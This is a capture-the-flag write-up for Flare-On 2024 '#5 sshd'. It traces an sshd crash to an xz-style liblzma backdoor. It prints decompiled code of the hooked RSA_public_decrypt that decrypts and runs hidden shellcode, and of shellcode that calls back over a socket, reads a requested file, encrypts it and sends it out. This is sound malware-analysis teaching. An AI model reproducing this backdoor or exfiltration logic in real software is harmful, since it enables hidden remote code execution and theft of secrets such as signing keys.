## Flare-On 2024 - #5 sshd
___

### Description: 

*Our server in the FLARE Intergalactic HQ has crashed!*
*Now criminals are trying to sell me my own data!!!*
*Do your part, random internet hacker, to help FLARE out and tell us what data they stole!*
*We used the best forensic preservation technique of just copying all the files on the system for you.*


`7-zip password: flare`
___

### Solution:

> NOTE: `sshd.7z` is too big. You can download it from
> [here](https://www.dropbox.com/scl/fi/w1txftw3p3j6nmrqrsmye/sshd.7z?rlkey=l4lhtr1evqltaj7mnh4p1xm6u&st=dv4i1m0l&dl=0).

From the challenge name we can expect something related to the famous 
[liblzma](https://www.openwall.com/lists/oss-security/2024/03/29/4) backdoor which became public
earlier this year. The
[Analysis of the xz-utils backdoor code](https://medium.com/@knownsec404team/analysis-of-the-xz-utils-backdoor-code-d2d5316ac43f)
provides a very detailed explanation of how the backdoor works.


In this challenge, we are given an `ssh_container` directory will files on the system. A classic
forensics technique is to sort all the files based on their last modification (see
[here](https://www.baeldung.com/linux/files-dir-sort-recursively)). We use the following command:
```
    find ./ -type f -exec ls -lt --time-style=+"%Y-%m-%d %T" {} + | sort -k6,7
```

The last modified files are:
```
-rw-r--r-- 1 ispo primarygroup   213777 2024-09-09 23:21:59 ./etc/ssl/certs/ca-certificates.crt
-rw-r--r-- 1 ispo primarygroup   274238 2024-09-09 23:21:59 ./var/lib/dpkg/status
-rw-r--r-- 1 ispo primarygroup     9740 2024-09-09 23:21:59 ./var/log/apt/history.log
-rw------- 1 ispo primarygroup  2084864 2024-09-09 23:34:36 ./var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676
-rw-r--r-- 1 ispo primarygroup     2304 2024-09-11 22:55:59 ./root/flag.txt
```

The most interesting file is `sshd.core.93794.0.0.11.1725917676` (`flag.txt` is of course a decoy),
which also aligns with the challenge description (*Our server [...] has crashed!*). Let's load the
core dump to gdb (the binary is located in `./usr/sbin/sshd`):
```
┌─[23:35:34]─[✗:1]─[ispo@ispo-glaptop2]─[~/ctf/flare-on-challenges/flare-on-2024/05_sshd/ssh_container]
└──> gdb -q ./usr/sbin/sshd ./var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
Reading symbols from ./usr/sbin/sshd...
(No debugging symbols found in ./usr/sbin/sshd)

warning: .dynamic section for "/lib/x86_64-linux-gnu/libwrap.so.0" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libsystemd.so.0" is not at the expected address (wrong library or version mismatch?)
warning: Build-id of /lib/x86_64-linux-gnu/libcrypto.so.3 does not match core file.
warning: .dynamic section for "/lib/x86_64-linux-gnu/libcrypto.so.3" is not at the expected address (wrong library or version mismatch?)
warning: Build-id of /lib/x86_64-linux-gnu/libc.so.6 does not match core file.
warning: .dynamic section for "/lib/x86_64-linux-gnu/libc.so.6" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libnsl.so.2" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libcap-ng.so.0" is not at the expected address (wrong library or version mismatch?)
warning: Build-id of /lib/x86_64-linux-gnu/libgcrypt.so.20 does not match core file.
warning: .dynamic section for "/lib/x86_64-linux-gnu/libgcrypt.so.20" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/liblzma.so.5" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libzstd.so.1" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib64/ld-linux-x86-64.so.2" is not at the expected address (wrong library or version mismatch?)
warning: Build-id of /lib/x86_64-linux-gnu/libkrb5support.so.0 does not match core file.
warning: .dynamic section for "/lib/x86_64-linux-gnu/libresolv.so.2" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libgpg-error.so.0" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libdl.so.2" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libpthread.so.0" is not at the expected address (wrong library or version mismatch?)
warning: Build-id of /lib/x86_64-linux-gnu/security/pam_unix.so does not match core file.
warning: .dynamic section for "/lib/x86_64-linux-gnu/security/pam_keyinit.so" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/security/pam_systemd.so" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libpam_misc.so.0" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/libm.so.6" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/security/pam_mail.so" is not at the expected address (wrong library or version mismatch?)
warning: .dynamic section for "/lib/x86_64-linux-gnu/security/pam_env.so" is not at the expected address (wrong library or version mismatch?)

warning: File "/usr/lib/x86_64-linux-gnu/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /usr/lib/x86_64-linux-gnu/libthread_db.so.1
line to your configuration file "/home/ispo/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/ispo/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Core was generated by `sshd: root [priv]      '.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000000000000 in ?? ()
```

We get a lot of warnings because gdb uses the libraries from our system (e.g.,
`/lib/x86_64-linux-gnu/libwrap.so.0`) instead of the ones in `ssh_container`. We can fix that by
doing a `chroot`:
```
┌─[23:40:29]─[✗:1]─[ispo@ispo-glaptop2]─[~/ctf/flare-on-challenges/flare-on-2024/05_sshd/ssh_container]
└──> sudo chroot .
root@ispo-glaptop2:/# gdb -q ./usr/sbin/sshd ./var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676
Reading symbols from ./usr/sbin/sshd...
(No debugging symbols found in ./usr/sbin/sshd)

warning: Can't open file / (deleted) during file-backed mapping note processing
[New LWP 7378]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Core was generated by `sshd: root [priv]      '.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000000000000 in ?? ()
(gdb) backtrace
#0  0x0000000000000000 in ?? ()
#1  0x00007f4a18c8f88f in ?? () from /lib/x86_64-linux-gnu/liblzma.so.5
#2  0x000055b46c7867c0 in ?? ()
#3  0x000055b46c73f9d7 in ?? ()
#4  0x000055b46c73ff80 in ?? ()
#5  0x000055b46c71376b in ?? ()
#6  0x000055b46c715f36 in ?? ()
#7  0x000055b46c7199e0 in ?? ()
#8  0x000055b46c6ec10c in ?? ()
#9  0x00007f4a18e5824a in __libc_start_call_main (main=main@entry=0x55b46c6e7d50, argc=argc@entry=4, 
    argv=argv@entry=0x7ffcc6602eb8) at ../sysdeps/nptl/libc_start_call_main.h:58
#10 0x00007f4a18e58305 in __libc_start_main_impl (main=0x55b46c6e7d50, argc=4, argv=0x7ffcc6602eb8, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffcc6602ea8) at ../csu/libc-start.c:360
#11 0x000055b46c6ec621 in ?? ()
(gdb) 
```

Now we have the correct **backtrace** :) Let's go to address `0x00007f4a18c8f88f` inside
`liblzma.so.5` to see what's there:
```
(gdb) disas 0x00007f4a18c8f877, 0x00007f4a18c8f8b7
Dump of assembler code from 0x7f4a18c8f877 to 0x7f4a18c8f8b7:
   0x00007f4a18c8f877:  xor    %edi,%edi
   0x00007f4a18c8f879:  call   0x7f4a18c8acf0 <dlsym@plt>
   0x00007f4a18c8f87e:  mov    %ebx,%r8d
   0x00007f4a18c8f881:  mov    %r14,%rcx
   0x00007f4a18c8f884:  mov    %r13,%rdx
   0x00007f4a18c8f887:  mov    %rbp,%rsi
   0x00007f4a18c8f88a:  mov    %r12d,%edi
   0x00007f4a18c8f88d:  call   *%rax
   0x00007f4a18c8f88f:  mov    0xe8(%rsp),%rbx
   0x00007f4a18c8f897:  xor    %fs:0x28,%rbx
   0x00007f4a18c8f8a0:  jne    0x7f4a18c8f975
   0x00007f4a18c8f8a6:  add    $0xf8,%rsp
   0x00007f4a18c8f8ad:  pop    %rbx
   0x00007f4a18c8f8ae:  pop    %rbp
   0x00007f4a18c8f8af:  pop    %r12
   0x00007f4a18c8f8b1:  pop    %r13
   0x00007f4a18c8f8b3:  pop    %r14
   0x00007f4a18c8f8b5:  pop    %r15
End of assembler dump.
(gdb) i r rax
rax            0x0                 0
(gdb)
```

`rax` is obviously zero and hence the crash. Now we load `liblzma.so.5` on IDA to see what is there:
```c
__int64 __fastcall u_RSA_public_decrypt_BACKDOORED((
        unsigned int a1_flen,
        __int32 *a2_from,
        __int64 a3_to,
        __int64 a4_rsa,
        unsigned int a5_padding)
{
  const char *func; // rsi
  void *RSA_public_decrypt; // rax
  void *buf; // rax
  void (*buf_)(void); // [rsp+8h] [rbp-120h]
  __int32 a1_state[32]; // [rsp+20h] [rbp-108h] BYREF
  unsigned __int64 canary; // [rsp+E8h] [rbp-40h]

  canary = __readfsqword(0x28u);
  func = "RSA_public_decrypt";
  if ( !getuid() )
  {
    if ( *a2_from == 0xC5407A48 )
    {
      u_chacha_init(a1_state, a2_from + 1, a2_from + 9, 0LL);
      buf = mmap(0LL, glo_mmap_len, 7, 34, -1, 0LL);// rwx
      buf_ = (void (*)(void))memcpy(buf, glo_ciphertext, glo_mmap_len);
      u_chacha_block((unsigned __int64 *)a1_state, buf_, glo_mmap_len);// decrypt
      buf_();                                   // run
      u_chacha_init(a1_state, a2_from + 1, a2_from + 9, 0LL);
      u_chacha_block((unsigned __int64 *)a1_state, buf_, glo_mmap_len);// encrypt again
    }
    func = "RSA_public_decrypt ";               // space causes a NULL return
  }
  RSA_public_decrypt = dlsym(0LL, func);
  return ((__int64 (__fastcall *)(_QWORD, __int32 *, __int64, __int64, _QWORD))RSA_public_decrypt)(
           a1_flen,
           a2_from,
           a3_to,
           a4_rsa,
           a5_padding);
}
```

That is pretty interesting... We have a backdoor here. This function is a wrapper around
[RSA_public_decrypt](https://docs.openssl.org/master/man3/RSA_private_encrypt/). However if the 
`from` parameter starts with `0xC5407A48`, then we decrypt the shellcode located in `glo_ciphertext`
(`7F4A18CA9960h`) using [ChaCha](https://en.wikipedia.org/wiki/Salsa20), execute it and re-encrypt
it immediately. The problem is that after executing the shellcode, `func` becomes
`RSA_public_decrypt ` (note the trailing space) and the `dlsym()` call returns `NULL`.

The (encrypted) shellcode is `glo_mmap_len` (`0F96h`) bytes long and it located below:
```
(gdb) x/32xb 0x7F4A18CA9960
0x7f4a18ca9960: 0x0f    0xb0    0x35    0x4e    0x81    0xfd    0x50    0xe5
0x7f4a18ca9968: 0x04    0xbf    0x6b    0x1b    0xc2    0x0f    0x66    0x16
0x7f4a18ca9970: 0x7f    0x1a    0x80    0x66    0x01    0x4b    0x3f    0xed
0x7f4a18ca9978: 0xa6    0x8b    0xaa    0x2d    0x42    0xae    0x3b    0xe8
```

To decrypt the shellcode we need to know the key. We can get the key from the core dump which is
located right after the `0xc5407a48` value:
```
(gdb) x/32xw $rbp
0x55b46d51dde0: 0xc5407a48  0x38f63d94  0xe21318a8  0xa51863de
0x55b46d51ddf0: 0xbaa0f907  0x7b8abb2d  0xd06636a6  0x5ea6118d
0x55b46d51de00: 0x6fd614c9  0x9f8336f2  0x1a71cd4d  0x55298652
0x55b46d51de10: 0xb7d15858  0x0dc2a7f9  0x190ede36  0x9605a3ea
0x55b46d51de20: 0xb9b959da  0x418f170d  0xeb7e3d42  0xdcb50715
0x55b46d51de30: 0x49b89c03  0xcc9859a8  0x9b371f61  0x50f20a4d
0x55b46d51de40: 0x2d37abbd  0xe216370c  0x114b40a3  0xa949ad51
0x55b46d51de50: 0x8e951a4a  0x91986b26  0x08a7b06a  0xf3d0cbee
```

According to the code: `u_chacha_init(a1_state, a2_from + 1, a2_from + 9, 0LL)`, the next **8**
DWORDs are the **key** and the next **12** the **nonce**:
```
key  : 0x38f63d94 0xe21318a8 0xa51863de 0xbaa0f907 0x7b8abb2d 0xd06636a6 0x5ea6118d 0x6fd614c9
nonce: 0x9f8336f2 0x1a71cd4d 0x55298652
```

We run [sshd_decrypt_shellcode.py](./sshd_decrypt_shellcode.py) and we get the decrypted shellcode.
___

### Reversing the shellcode


Instead of analyzing the shellcode as standalone, we patch into `glo_ciphertext` to have the correct
offsets:
```assembly
.rodata:00007F4A18CA9960
.rodata:00007F4A18CA9960 glo_ciphertext:                         ; DATA XREF: u_RSA_public_decrypt_BACKDOORED+EF↑o
.rodata:00007F4A18CA9960                 push    rbp
.rodata:00007F4A18CA9961                 mov     rbp, rsp
.rodata:00007F4A18CA9964                 call    u_shellcode_main
.rodata:00007F4A18CA9969                 leave
.rodata:00007F4A18CA996A                 retn
```

Everything happens inside `u_shellcode_main`:
```c
__int64 u_shellcode_main()
{
  unsigned int sock; // ebx
  signed __int64 v1; // rax
  signed __int64 v2; // rax
  signed __int64 v3; // rax
  signed __int64 filename_len; // rax
  signed __int64 fd; // rax
  signed __int64 filelen; // rax
  unsigned __int64 v7; // kr08_8
  signed __int64 v8; // rax
  signed __int64 v9; // rax
  char key[32]; // [rsp+410h] [rbp-1278h] BYREF
  char nonce[16]; // [rsp+430h] [rbp-1258h] BYREF
  char filename[256]; // [rsp+440h] [rbp-1248h] BYREF
  char buf[4224]; // [rsp+540h] [rbp-1148h] BYREF
  unsigned int filename_size; // [rsp+15C0h] [rbp-C8h] BYREF
  unsigned int size_4; // [rsp+15C4h] [rbp-C4h] BYREF

  sock = u_reverse_sock();
  v1 = sys_recvfrom(sock, key, 0x20uLL, 0, 0LL, 0LL);
  v2 = sys_recvfrom(sock, nonce, 0xCuLL, 0, 0LL, 0LL);
  v3 = sys_recvfrom(sock, &filename_size, 4uLL, 0, 0LL, 0LL);
  filename_len = sys_recvfrom(sock, filename, filename_size, 0, 0LL, 0LL);
  filename[(int)filename_len] = 0;
  fd = sys_open(filename, 0, 0);
  filelen = sys_read(fd, buf, 0x80uLL);
  v7 = strlen(buf) + 1;
  size_4 = v7 - 1;
  u_chacha20_init((__int64)&buf[v7], (__int64)buf, (__int64)key, (__int64)nonce, 0LL);
  u_chacha20_encr((__int64)&buf[v7], (__int64)buf, (__int64)buf, size_4);
  v8 = sys_sendto(sock, &size_4, 4uLL, 0, 0LL, 0);
  v9 = sys_sendto(sock, buf, size_4, 0, 0LL, 0);
  u_sys_close();
  u_sys_shutdown(sock, (__int64)buf, 0);
  return 0LL;
}
```

The shellcode opens a reverse shell and reads a `key`, a `nonce` a `filename_size` and a `filename`.
Then it reads that file, encrypts it using [ChaCha](https://en.wikipedia.org/wiki/Salsa20) and
returns it back to the server.


Even though the shellcode has been re-encrypted, the parameters (`key`, `nonce`, `filename_size`,
`filename`) are still in the core dump. We **use the stack offsets to locate these values**. At the
time of the crash, `rsp` is `0x7ffcc6601e98`:
```
(gdb) i r rsp
rsp            0x7ffcc6601e98      0x7ffcc6601e98
```

After prolog of `u_shellcode_main`, `rsp` has been moved by

```assembly
.rodata:00007F4A18CA9960 glo_ciphertext:
.rodata:00007F4A18CA9960                 push    rbp                ; +8
.rodata:00007F4A18CA9961                 mov     rbp, rsp
.rodata:00007F4A18CA9964                 call    u_shellcode_main   ; +0x10
.rodata:00007F4A18CA9969                 leave
.rodata:00007F4A18CA996A                 retn

.rodata:00007F4A18CAA722 u_shellcode_main proc near
.rodata:00007F4A18CAA722                 push    rbx                ; +0x18
.rodata:00007F4A18CAA723                 push    rsi                ; +0x20
.rodata:00007F4A18CAA724                 push    rdi                ; +0x28
.rodata:00007F4A18CAA725                 push    r12                ; +0x30
.rodata:00007F4A18CAA727                 push    rbp                ; +0x38
.rodata:00007F4A18CAA728                 mov     rbp, rsp
.rodata:00007F4A18CAA72B                 lea     rsp, [rsp-1688h]   ; -0x1688 + 0x38
```

From the decompiled output we get the following offsets:
```c
  char key[32]; // [rsp+410h] [rbp-1278h] BYREF
  char nonce[16]; // [rsp+430h] [rbp-1258h] BYREF
  char filename[256]; // [rsp+440h] [rbp-1248h] BYREF
  char buf[4224]; // [rsp+540h] [rbp-1148h] BYREF
```

For example the filename should be at offset `$rsp-0x1688-0x38+0x440`. Let's try it out:
```
(gdb) x/s $rsp-0x1688-0x38+0x440
0x7ffcc6600c18: "/root/certificate_authority_signing_key.txt"
```

Good! Now we get the `key`, the `nonce` and the (encrypted) `buf`:
```
(gdb) x/8xw $rsp-0x1688-0x38+0x410
0x7ffcc6600be8: 0x1291ec8d  0xda0e76eb  0xa4877d7c  0x351c2743
0x7ffcc6600bf8: 0x87cbe0d9  0xd9b49389  0x34f9ae04  0xd76621fa

(gdb) x/4xw $rsp-0x1688-0x38+0x430
0x7ffcc6600c08: 0x11111111  0x11111111  0x11111111  0x00000020

(gdb) x/64xb $rsp-0x1688-0x38+0x540
0x7ffcc6600d18: 0xa9    0xf6    0x34    0x08    0x42    0x2a    0x9e    0x1c
0x7ffcc6600d20: 0x0c    0x03    0xa8    0x08    0x94    0x70    0xbb    0x8d
0x7ffcc6600d28: 0xaa    0xdc    0x6d    0x7b    0x24    0xff    0x7f    0x24
0x7ffcc6600d30: 0x7c    0xda    0x83    0x9e    0x92    0xf7    0x07    0x1d
0x7ffcc6600d38: 0x02    0x63    0x90    0x2e    0xc1    0x58    0x00    0x00
0x7ffcc6600d40: 0xd0    0xb4    0x58    0x6d    0xb4    0x55    0x00    0x00
0x7ffcc6600d48: 0x20    0xea    0x78    0x19    0x4a    0x7f    0x00    0x00
0x7ffcc6600d50: 0xd0    0xb4    0x58    0x6d    0xb4    0x55    0x00    0x00
```

It seems we have everything now.... We try to decrypt the file using
[ChaCha](https://en.wikipedia.org/wiki/Salsa20) but the plaintext is now what we want... Perhaps
the algorithm is not ChaCha, or it is a modified version of it. Let's try something else: Let's
create a mock server, run the shellcode and make it connect to us. Then we will ask it to encrypt
a file that contains the ciphertext. Since the encryption algorithm is symmetric, the the encryption
of the ciphertext will give us the original plaintext. We try it out and it works:

```
┌─[01:15:02]─[✗:1]─[ispo@ispo-glaptop2]─[~/ctf/flare-on-challenges/flare-on-2024/05_sshd]
└──> ./sshd_crack.py 
[+] sshd crack started.
Connected by ('127.0.0.1', 56928)
[+] Received filesize: 32
[+] Received file: b'supp1y_cha1n_sund4y@flare-on.com'
[+] Program finished successfully. Bye bye :)


┌─[01:15:10]─[ispo@ispo-glaptop2]─[~/ctf/flare-on-challenges/flare-on-2024/05_sshd]
└──> qiling/qltool code --os linux --arch x8664 --format hex -f shellcode_hex --rootfs=.
```

For more details, please refer to the [sshd_crack.py](./sshd_crack.py)


So the flag is: `supp1y_cha1n_sund4y@flare-on.com`
___
